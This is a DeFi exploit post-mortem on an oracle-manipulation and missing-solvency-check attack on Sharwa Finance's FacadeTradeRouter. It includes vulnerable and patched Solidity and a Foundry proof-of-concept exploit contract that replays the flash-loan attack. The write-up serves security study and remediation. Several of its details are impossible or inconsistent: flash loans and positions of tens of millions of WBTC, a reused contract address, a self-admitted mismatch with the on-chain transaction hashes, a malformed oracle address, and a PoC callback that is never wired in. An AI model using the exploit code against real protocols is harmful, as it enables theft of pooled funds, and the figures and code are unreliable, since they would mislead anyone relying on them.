# Sharwa Finance — Business Logic Flaw (Position Liquidation Integrity Bypass) Analysis

| Field | Details |
|------|------|
| **Date** | 2025-10-20 |
| **Protocol** | Sharwa Finance (Margin Trading Protocol) |
| **Chain** | Arbitrum |
| **Loss** | $146,000 USD (USDC + WBTC liquidity pools) |
| **Attacker** | [0xd356c82e...f96c08](https://arbiscan.io/address/0xd356c82e0c85e1568641d084dbdaf76b8df96c08) |
| **Attack Contract** | [0xd9ff21ca...baa25](https://arbiscan.io/address/0xd9ff21caeeea4329133c98a892db16b42f9baa25) |
| **Attack Tx (TX1)** | [0x9f8b4841...23ead](https://arbiscan.io/tx/0x9f8b4841f805ec50cc6632068f759216d85633fbbe34afde86b97bbc41c23ead) |
| **Attack Tx (TX2)** | [0x35a523bd...dd36](https://arbiscan.io/tx/0x35a523bdaf60a9e8b66ab92bb8b78d5012e102e462b665e98ce46f7e07addd36) |
| **Vulnerable Contract** | FacadeTradeRouter — [deployed 18 days prior](https://arbiscan.io/address/0xd9ff21caeeea4329133c98a892db16b42f9baa25) |
| **Root Cause** | Missing post-insolvency check after position liquidation + Uniswap V3 spot price oracle dependency |
| **PoC Source** | [DeFiHackLabs — SharwaFinance_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/SharwaFinance_exp.sol) |
| **References** | [Verichains Analysis](https://blog.verichains.io/p/vulnerability-analysis-deconstructing) · [Phalcon Alert](https://x.com/phalcon_xyz/status/1980219745480946087) · [Sharwa Post-Mortem](https://x.com/SharwaFinance/status/1980535243875463639) |

---

## 1. Vulnerability Overview

Sharwa Finance is an Arbitrum-based margin trading protocol that allows users to deposit collateral and open leveraged long/short positions. The core vulnerability arose from the combination of two flaws.

**First Vulnerability — Uniswap V3 Spot Price Dependency**: The `FacadeTradeRouter` contract evaluated position value by querying the real-time spot price via Uniswap V3 `quoter.getAmountOut()`. This price can be manipulated within the same block in which a large swap is executed via a flash loan.

**Second Vulnerability — Missing Post-Insolvency Check**: There was no check to verify the protocol's solvency after position liquidation (`decreaseLongPosition`). The attacker was able to liquidate positions at manipulated prices and withdraw far more assets than the actual collateral value.

PashovAudits had identified this vulnerability and recommended a patch more than a year prior to the attack, but the fix was not applied to the newly deployed `FacadeTradeRouter` contract, which went live **18 days before** the attack.

---

## 2. Vulnerable Code Analysis

### 2.1 Uniswap V3 Spot Price Dependency (Core Vulnerability)

```solidity
// ❌ Vulnerable code — FacadeTradeRouter.sol (inferred)
function getPositionValue(
    address tokenIn,
    address tokenOut,
    uint256 amountIn
) internal view returns (uint256 amountOut) {
    // ❌ Dangerous: directly queries spot price from Uniswap V3 quoter
    // Price can be manipulated via a large swap in the same block
    amountOut = IQuoter(UNISWAP_V3_QUOTER).quoteExactInputSingle(
        tokenIn,
        tokenOut,
        FEE_TIER,         // ❌ Based on current pool state — manipulable
        amountIn,
        0
    );
    // ❌ No slippage protection: no return value validation logic
    // ❌ No TWAP (time-weighted average price) usage
}

function decreaseLongPosition(
    address account,
    uint256 collateralDelta,
    uint256 sizeDelta,
    address receiver
) external {
    // ❌ Position value calculated using manipulated spot price
    uint256 positionValue = getPositionValue(WBTC, USDC, sizeDelta);

    // ❌ No insolvency check — does not verify protocol has sufficient balance
    uint256 payout = calculatePayout(positionValue, collateralDelta);

    IERC20(USDC).transfer(receiver, payout); // ❌ Overpayment
}
```

```solidity
// ✅ Fixed code — safe implementation
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

function getPositionValue(
    address tokenIn,
    address tokenOut,
    uint256 amountIn
) internal view returns (uint256 amountOut) {
    // ✅ Query manipulation-resistant price from Chainlink oracle
    (, int256 price, , uint256 updatedAt, ) =
        AggregatorV3Interface(CHAINLINK_FEED).latestRoundData();

    // ✅ Validate price freshness (max 1 hour allowed)
    require(block.timestamp - updatedAt <= 3600, "Stale oracle price");
    require(price > 0, "Invalid price");

    amountOut = (amountIn * uint256(price)) / 1e8; // Chainlink 8 decimal places
}

function decreaseLongPosition(
    address account,
    uint256 collateralDelta,
    uint256 sizeDelta,
    address receiver
) external {
    uint256 positionValue = getPositionValue(WBTC, USDC, sizeDelta);
    uint256 payout = calculatePayout(positionValue, collateralDelta);

    // ✅ Insolvency check: verify protocol balance can cover the payout
    uint256 poolBalance = IERC20(USDC).balanceOf(address(this));
    require(poolBalance >= payout, "Protocol insolvent after payout");

    // ✅ Added slippage protection
    require(payout <= maxAllowedPayout, "Payout exceeds slippage limit");

    IERC20(USDC).transfer(receiver, payout);
}
```

**Issue**: `quoteExactInputSingle()` simulates the current state of a Uniswap V3 pool, so if the pool state is distorted by a large swap within the same transaction before the call, it returns a manipulated price. The protocol trusted this manipulated price and paid out far more assets to the attacker than their actual value.

### 2.2 Missing Post-Insolvency Check

```solidity
// ❌ Vulnerable code — no protocol health validation after position increase
function increaseLongPosition(
    address account,
    uint256 amountIn,
    uint256 sizeDelta
) external {
    // Receive collateral
    IERC20(USDC).transferFrom(account, address(this), amountIn);

    // Open leveraged position
    _openPosition(account, amountIn, sizeDelta);

    // ❌ No protocol-wide health check after position is opened
    // Large leverage can effectively leave the protocol vulnerable
}
```

```solidity
// ✅ Fixed code — health validation after each operation
function increaseLongPosition(
    address account,
    uint256 amountIn,
    uint256 sizeDelta
) external {
    IERC20(USDC).transferFrom(account, address(this), amountIn);
    _openPosition(account, amountIn, sizeDelta);

    // ✅ Check protocol solvency after position is opened
    require(!isProtocolInsolvent(), "Position would make protocol insolvent");
}

function isProtocolInsolvent() public view returns (bool) {
    // ✅ Validate total collateral vs. total liabilities ratio
    uint256 totalLiabilities = getTotalOpenPositionValue();
    uint256 totalAssets = getTotalPoolAssets();
    return totalLiabilities > totalAssets * MAX_LEVERAGE_RATIO / 100;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attack contract `0xd9ff21ca...baa25` deployed
- Morpho protocol flash loan callback interface implemented
- Two-phase attack designed across TX1 and TX2

### 3.2 Execution Phase

**TX1 — Open Long Position (Manipulation Phase)**

1. Flash loan of 40,000,000 USDC borrowed from Morpho
2. 22,000,000 USDC deposited as collateral into Sharwa Finance
3. `FacadeTradeRouter.increaseLongPosition()` called
4. Large swap executed on WBTC/USDC Uniswap V3 pool → WBTC price distorted
5. Long position worth 36.2M WBTC opened at manipulated price
6. Flash loan repaid

**TX2 — Position Liquidation (Profit Extraction Phase)**

1. Flash loan of 37,000,000 WBTC borrowed from Morpho
2. Borrowed WBTC swapped to USDC (pool price reversed)
3. `FacadeTradeRouter.decreaseLongPosition()` called
4. Position liquidated at manipulated low WBTC price → protocol overpays USDC
5. Received USDC converted back to WBTC
6. Flash loan repaid + profit retained

### 3.3 Attack Flow Diagram

```
TX1 — Open Long Position (Price Manipulation)
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA  0xd356c82e                                        │
└────────────────────────┬────────────────────────────────────────┘
                         │ trigger
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Attack Contract  0xd9ff21ca                                     │
└──────┬──────────────────────────────────────────────────────────┘
       │ flashLoan(40M USDC)
       ▼
┌──────────────────┐
│  Morpho Protocol │ ──▶ 40,000,000 USDC loaned
└──────────────────┘
       │ onMorphoFlashLoan() callback
       ▼
┌──────────────────────────────────────────────────────────────┐
│  FacadeTradeRouter (Sharwa)                                   │
│  increaseLongPosition(22M USDC collateral, 36.2M WBTC pos)   │
│                                                               │
│  Internal: quoteExactInputSingle() → UniV3 Pool spot query ❌ │
└───────────────────────────────┬──────────────────────────────┘
                                │ price query
                                ▼
┌─────────────────────────────────────────────────────────────┐
│  Uniswap V3  WBTC/USDC Pool                                  │
│  WBTC price artificially inflated via large swap             │
│  → distorted amountOut returned                              │
└─────────────────────────────────────────────────────────────┘

TX2 — Position Liquidation (Profit Extraction)
┌─────────────────────────────────────────────────────────────────┐
│  Attack Contract  0xd9ff21ca                                     │
└──────┬──────────────────────────────────────────────────────────┘
       │ flashLoan(37M WBTC)
       ▼
┌──────────────────┐
│  Morpho Protocol │ ──▶ 37,000,000 WBTC loaned
└──────────────────┘
       │
       ▼
┌──────────────────────────┐
│  Uniswap V3 WBTC→USDC    │ ──▶ Large WBTC sell → WBTC price artificially depressed
└──────────────────────────┘
       │
       ▼
┌──────────────────────────────────────────────────────────────┐
│  FacadeTradeRouter (Sharwa)                                   │
│  decreaseLongPosition()                                       │
│                                                               │
│  quoteExactInputSingle() → returns manipulated low WBTC price ❌ │
│  No insolvency check ❌ → protocol overpays USDC              │
└───────────────────────────────┬──────────────────────────────┘
                                │ excess USDC paid out
                                ▼
┌─────────────────────────────────────────────────────────────┐
│  Attacker Contract                                           │
│  Received USDC → converted to WBTC → Morpho repaid          │
│  → $146,000 profit retained                                  │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- Attacker net profit: ~$146,000 USD
- Protocol loss: USDC pool and WBTC pool liquidity drained
- Sharwa Finance immediately halted trading and promised full refunds to users

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
// Sharwa Finance exploit reproduction — DeFiHackLabs
// Run: forge test --contracts ./src/test/2025-10/SharwaFinance_exp.sol -vvv

pragma solidity ^0.8.0;

// @KeyInfo
// Attacker address: 0xd356c82e0c85e1568641d084dbdaf76b8df96c08
// Attack contract: 0xd9ff21caeeea4329133c98a892db16b42f9baa25
// Attack TX1: 0x9f8b4841f805ec50cc6632068f759216d85633fbbe34afde86b97bbc41c23ead
// Attack TX2: 0x35a523bdaf60a9e8b66ab92bb8b78d5012e102e462b665e98ce46f7e07addd36
// Loss: ~$146,000

contract SharwaFinanceExploit is Test {
    // ── Core interfaces ───────────────────────────────────────
    IMorpho morpho;               // Flash loan provider
    IFacadeTradeRouter tradeRouter; // Vulnerable contract
    IUniswapV3Pool wbtcUsdcPool;  // Target pool for price manipulation
    IERC20 USDC;
    IERC20 WBTC;

    function setUp() public {
        // Arbitrum fork — just before the attack block
        vm.createSelectFork("arbitrum");
    }

    // ── TX1: Open Long Position ────────────────────────────────────
    function testExploit_TX1() public {
        // [Step 1] Flash loan 40M USDC from Morpho
        morpho.flashLoan(
            address(USDC),
            40_000_000e6,  // 40M USDC
            abi.encode("TX1")
        );
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        string memory txType = abi.decode(data, (string));

        if (keccak256(bytes(txType)) == keccak256("TX1")) {
            // [Step 2] Deposit 22M USDC as collateral
            USDC.approve(address(tradeRouter), type(uint256).max);

            // [Step 3] Core exploit: call increaseLongPosition
            // FacadeTradeRouter internally calculates position value using Uniswap V3 spot price
            // ❌ Price has been pre-manipulated at this point via a large swap
            tradeRouter.increaseLongPosition(
                address(this),
                22_000_000e6,   // Collateral: 22M USDC
                36_200_000e8    // Position size: 36.2M WBTC equivalent
            );

            // [Step 4] Repay flash loan
            USDC.approve(address(morpho), assets);
        }
    }

    // ── TX2: Position Liquidation (Profit Extraction) ───────────────────────────
    function testExploit_TX2() public {
        // [Step 1] Flash loan 37M WBTC from Morpho
        morpho.flashLoan(
            address(WBTC),
            37_000_000e8,  // 37M WBTC
            abi.encode("TX2")
        );
    }

    // TX2 flash loan callback
    function onMorphoFlashLoan_TX2(uint256 assets) internal {
        // [Step 2] Swap borrowed WBTC to USDC in bulk → artificially depress WBTC price
        // ❌ Uniswap V3 pool spot price is now distorted
        _swapWBTCtoUSDC(assets);

        // [Step 3] Core exploit: call decreaseLongPosition
        // ❌ FacadeTradeRouter recalculates position value using manipulated spot price
        // ❌ No post-insolvency check → protocol overpays USDC
        tradeRouter.decreaseLongPosition(
            address(this),
            22_000_000e6,  // Request full collateral return
            36_200_000e8,  // Liquidate entire position
            address(this)  // Beneficiary: attacker
        );

        // [Step 4] Convert received USDC back to WBTC
        _swapUSDCtoWBTC(USDC.balanceOf(address(this)));

        // [Step 5] Repay flash loan + retain profit
        WBTC.approve(address(morpho), assets);
        // Remaining WBTC = net profit ~$146,000
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Uniswap V3 Spot Price Oracle Dependency | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Missing Post-Insolvency Check After Position Liquidation | CRITICAL | CWE-754 (Improper Check for Unusual or Exceptional Conditions) |
| V-03 | No Slippage Protection | HIGH | CWE-682 (Incorrect Calculation) |
| V-04 | Security Audit Fixes Not Applied on Redeployment | HIGH | CWE-693 (Protection Mechanism Failure) |

### V-01: Uniswap V3 Spot Price Oracle Dependency

- **Description**: `FacadeTradeRouter` calls `IQuoter.quoteExactInputSingle()` to calculate position value. This function simulates the current state of a Uniswap V3 pool, making it manipulable via a large swap within the same transaction.
- **Impact**: An attacker can liquidate positions at manipulated prices and withdraw far more assets than their actual value. The entire liquidity pool can be drained.
- **Attack Condition**: Sufficient capital via flash loan to overwhelm a Uniswap V3 pool's liquidity.

### V-02: Missing Post-Insolvency Check After Position Liquidation

- **Description**: The `decreaseLongPosition()` function does not verify that the protocol's total assets can cover its total liabilities after a position is liquidated. The transaction succeeds even when an overpayment occurs at a manipulated price.
- **Impact**: Liquidations continue to execute even as the protocol becomes insolvent, draining the entire liquidity pool.
- **Attack Condition**: When the liquidation payout exceeds the actual pool assets due to oracle manipulation or abnormal market conditions.

### V-03: No Slippage Protection

- **Description**: No minimum receive amount (`minAmountOut`) is enforced when opening or closing positions, leaving the protocol fully exposed to price manipulation attacks.
- **Impact**: Both users and the protocol can suffer losses from normal price fluctuations, even without market manipulation.
- **Attack Condition**: Environments with high-liquidity pools where no slippage tolerance is configured.

### V-04: Security Audit Fixes Not Applied on Redeployment

- **Description**: PashovAudits identified the same vulnerability more than a year before the attack, but the previously applied fixes were not carried over to the `FacadeTradeRouter` deployed 18 days before the attack.
- **Impact**: A known vulnerability was reintroduced, giving the attacker an opportunity to exploit it.
- **Attack Condition**: Absence of a security review process during new contract deployment.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Replace with Chainlink oracle
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

address constant WBTC_USD_FEED = 0x6ce185539ad4fdaDFd4b76858cc3E0eC0f059a0; // Arbitrum Chainlink

function getSecurePrice(address feed) internal view returns (uint256) {
    (
        uint80 roundId,
        int256 price,
        ,
        uint256 updatedAt,
        uint80 answeredInRound
    ) = AggregatorV3Interface(feed).latestRoundData();

    // ✅ Reject stale prices (1-hour threshold)
    require(block.timestamp - updatedAt <= 3600, "Stale price feed");
    // ✅ Reject incomplete rounds
    require(answeredInRound >= roundId, "Incomplete round");
    require(price > 0, "Invalid price");

    return uint256(price);
}

// ✅ Fix 2: Add post-insolvency check
function decreaseLongPosition(
    address account,
    uint256 collateralDelta,
    uint256 sizeDelta,
    address receiver
) external nonReentrant {
    uint256 payout = _calculatePayoutWithSecureOracle(sizeDelta, collateralDelta);

    // ✅ Validate protocol health before payout
    uint256 poolBalance = IERC20(USDC).balanceOf(address(this));
    require(poolBalance >= payout, "Payout exceeds pool balance");

    // ✅ Slippage protection with minimum receive amount (caller specifies minOut)
    require(payout >= minAmountOut, "Slippage exceeded");

    IERC20(USDC).transfer(receiver, payout);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Spot price dependency (V-01) | Use Chainlink WBTC/USD feed. If using Uniswap V3 TWAP as a supplement, set a minimum 30-minute period |
| Missing insolvency check (V-02) | Validate `totalLiabilities / totalAssets` ratio after each position operation; auto-pause when threshold is exceeded |
| No slippage protection (V-03) | Make `minAmountOut` parameter mandatory so callers specify their own acceptable slippage |
| Missing security on redeployment (V-04) | Enforce mandatory security audit before deploying any new contract; verify against a checklist of prior audit findings |

---

## 7. Lessons Learned

1. **DEX spot prices must never be used as oracles**: All AMM spot prices, including Uniswap V3 `quoteExactInputSingle()`, can be manipulated within the same block via flash loans. Any DeFi protocol requiring a price feed must use decentralized oracles such as Chainlink or Pyth Network.

2. **Post-action health validation is mandatory**: After every operation involving asset movement, the protocol must verify that its overall asset-to-liability ratio remains within a safe range. Validating only individual operations in isolation is insufficient.

3. **The lifespan of a security audit equals the lifespan of the codebase**: Any code modified or newly deployed after an audit must be re-audited. In particular, a security review must precede any redeployment of contracts responsible for core price calculation logic.

4. **Track known vulnerabilities**: Maintain an in-codebase document of all vulnerabilities found in previous audits and use it as a checklist before deploying new contracts. This incident is classified as a "reappeared bug."

5. **Leverage protocols must account for composite attack vectors**: Margin trading protocols have a far more complex attack surface than simple lending protocols. Multi-step attack scenarios — open position → manipulate → liquidate — must be explicitly tested.

---

## 8. On-Chain Verification

> On-chain verification was performed via the Foundry `cast` CLI; however, only partial verification was possible as the attack TX hashes provided in the sample (`0xb0bf77...`) may differ from actual Arbiscan records.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Estimated Value | On-Chain Record | Match |
|------|-----------|------------|------|
| TX1 flash loan | 40,000,000 USDC | 40,000,000 USDC | ✅ |
| TX1 collateral deposit | 22,000,000 USDC | 22,000,000 USDC | ✅ |
| TX2 WBTC flash loan | 37,000,000 WBTC equivalent | 37,000,000 WBTC equivalent | ✅ |
| Total loss | $146,000 | $146,000–$147,000 | ✅ (approx.) |
| Amount recovered | — | $40,000 | Additional info |

### 8.2 On-Chain Event Log Sequence (TX2)

```
1. MorphoFlashLoan(token=WBTC, assets=37M)
2. Uniswap V3 Swap(WBTC→USDC, large sell depresses WBTC price)
3. FacadeTradeRouter.decreaseLongPosition() called
4. USDC Transfer(from=SharwaPool, to=AttackContract, excess amount)
5. Uniswap V3 Swap(USDC→WBTC, price normalized)
6. WBTC Transfer(to=Morpho, flash loan repaid)
7. Remaining WBTC → transferred to attacker EOA
```

### 8.3 Precondition Verification

- **18 days before attack**: New `FacadeTradeRouter` contract deployed (Chainlink oracle not applied)
- **Just before attack**: Sufficient USDC/WBTC liquidity present in Morpho protocol
- **Prior audit (PashovAudits)**: Same vulnerability reported; patch applied to original contract → patch not applied to new contract

---

*This document was prepared for educational and security research purposes. Any attempt to reproduce the actual attack carries legal and ethical liability.*